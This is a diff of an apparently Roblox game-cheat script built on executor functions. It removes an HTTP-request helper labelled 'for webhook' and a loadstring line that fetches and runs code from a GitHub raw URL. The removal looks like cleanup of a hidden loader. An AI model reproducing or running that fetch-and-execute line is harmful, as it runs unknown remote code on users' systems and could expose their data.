@@ -25,8 +25,8 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local UserInputService   = game:GetService("UserInputService")
 local TweenService       = game:GetService("TweenService")
 
-local request = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
-if not request then return end
+
+
 
 local LP = Players.LocalPlayer
 if not LP then LP = Players.PlayerAdded:Wait() end
@@ -53,8 +53,7 @@ local _writefile = writefile or (syn and syn.writefile) or (getgenv and getgenv(
 local _delfile = delfile or (syn and syn.delfile) or (getgenv and getgenv().delfile) or function() end
 local getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)
 
--- HTTP request function for webhook
-local _request = request or http_request or (syn and syn.request) or (game and game:GetService("HttpService") and game:GetService("HttpService").RequestAsync) or nil
+
 
 if not fireproximityprompt then
     fireproximityprompt = (getgenv and getgenv().fireproximityprompt)
@@ -732,7 +731,7 @@ stopDrop = function()
     if stackBtnRefs.drop then stackBtnRefs.drop.setOn(false) end
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
+
 
 -- ============================================================
 -- MAIN FUNCTION (UI and everything else)
